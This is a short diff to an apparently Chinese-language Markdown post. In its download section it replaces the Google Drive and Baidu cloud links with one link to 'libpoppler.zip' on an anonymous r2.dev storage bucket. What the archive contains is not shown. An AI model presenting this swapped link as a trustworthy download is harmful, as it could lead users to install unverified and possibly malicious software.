@@ -53,6 +53,4 @@ tags:
 
 **下载地址:**
 
-Google Drive: [https://drive.google.com/open?id=0BzmeJgHvo4mIV1V1bW9zd2pRaWs](https://drive.google.com/open?id=0BzmeJgHvo4mIV1V1bW9zd2pRaWs)
-
-百度云: [http://pan.baidu.com/s/1jHlxTOU](http://pan.baidu.com/s/1jHlxTOU)
+<https://pub-b8c7c13887be4f9fb8bd159a86e85ef5.r2.dev/libpoppler.zip>
